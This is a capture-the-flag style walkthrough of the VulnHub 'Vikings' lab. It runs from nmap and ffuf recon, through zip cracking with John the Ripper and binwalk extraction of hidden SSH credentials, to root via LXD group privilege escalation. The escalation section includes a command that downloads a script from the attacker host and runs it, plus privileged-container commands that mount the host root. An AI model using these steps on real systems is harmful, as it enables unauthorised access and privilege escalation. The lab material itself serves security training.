```http
https://www.vulnhub.com/entry/vikings-1,741/
```

```IP
192.168.3.184
```
___
# Recon
## Nmap 
```bash
sudo nmap -p- -sC -sV -Pn -T5 192.168.3.184 -vv
```

```resoults
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 59:d4:c0:fd:62:45:97:83:15:c0:15:b2:ac:25:60:99 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl/nNxpgD8pBLaBEjssXfC9g5KX5nL/B5EX8DOEFoX26y5GBVEIy48QNZl1/DcrfSgz4zhNFsN1JfYozwR5ejGJME/uXU/+Pfh0jolHfoWeeOQ+HxYGzfLVSi3+lwFeEv5kO+0tcDxoJtGN71DrNWR6AiJY8GMj5rfKq3s2Xls4MQI28ceEeGJ/3f7kza2tCI1Qdmf3aZx0Vwi6rSzjrh8B/YRGilYg12LQi/Es/0z7W5Bmk2jpQ13yEXEmnDYsdro9mfwxs7EbRO6PAZiUKjBp66YQOCCUHcnVGqtCgOjp4W4PXuJqiyAXE1CZve571/PKjZDWE6XjWO1KtxEse/n
|   256 7e:37:f0:11:63:80:15:a3:d3:9d:43:c6:09:be:fb:da (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAm7Q4EltppImi4EqXSAmew9iBHJ49VZtJJpkg/7HBwtFsjQVdiVi4Ql7rUfDtPs0H+aKBJboRzFuTMN6vLSBxU=
|   256 52:e9:4f:71:bc:14:dc:00:34:f2:a7:b3:58:b5:0d:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPqyW1YOWvhciEBwaZUzRr6p6BvuZBU1S2AynD+HRSZb
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2020-10-29 21:07  site/
|_
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

> [!important]
> 22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0
> 80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29

___
## WEB

> [!Web]
> 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.29

```http
http://192.168.3.184/site/
```

```bash 
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt:FFUZ -u http://192.168.3.184/site/FFUZ.txt -ic -c 
```

```http
http://192.168.3.184/site/war.txt
```

## Texts
```http
http://192.168.3.184/site/war-is-over/
```

```bash
file text 
text: ASCII text, with very long lines (65536), with no line terminators
```

```bash
cat text | base64 -d | >> text1
```

![[20250514191017.png]]

## John
> [!Cheats]
> https://medium.com/@rundcodehero/cracking-a-password-protected-zip-file-with-john-the-ripper-a-hands-on-guide-1aea0f6b3627

```bash
zip2john text1 > hash.txt
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![vikings](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/vikings/screenshots/20250514192446.png)
___

## Shorthand?
```bash
exiftool king 
```

```resoults
n/a
```
___

![vikings](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/vikings/screenshots/20250514193156.png)

```resoults
n/a
```
___

```bash
binwalk king.jpeg
```

```bash resoults
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, EXIF standard
12            0xC             TIFF image data, big-endian, offset of first image directory: 8
1429567       0x15D03F        Zip archive data, at least v2.0 to extract, compressed size: 53, uncompressed size: 92, name: user
1429740       0x15D0EC        End of Zip archive, footer length: 22
```


```bash
binwalk -e king.jpeg 
```

![vikings](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/vikings/screenshots/20250514194005.png)


```creds
//FamousBoatbuilder_floki@vikings                                     
//f@m0usboatbuilde7 
```


# SSH

> [!Open Pors SSH services]
> 22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)

```bash 
floki:f@m0usboatbuilde7
```
___

# LPE
![vikings](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/vikings/screenshots/20250514194835.png)
## Flag1
![vikings](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/vikings/screenshots/20250514195142.png)

```bash
wget http://192.168.3.182/linpeas.sh && chmod +x linpeas.sh  && ./linpeas.sh 
```
![vikings](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/vikings/screenshots/20250514195812.png)
![vikings](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/vikings/screenshots/20250514195821.png)

# LXD groups

```http
https://amanisher.medium.com/lxd-privilege-escalation-in-linux-lxd-group-ec7cafe7af63
```

```bash
wget 192.168.3.182/lxd-alpine-builder/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

```bash
lxc storage create LPE dir
lxc storage list
lxc init myimage ignite -c security.privileged=true
lxc init myimage ignite -c security.privileged=true -s LPE
lxc config device add ignite host-root disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite -- sh
```


![vikings](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/vikings/screenshots/20250514214141.png)
# Flag2
![vikings](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/vikings/screenshots/20250514214237.png)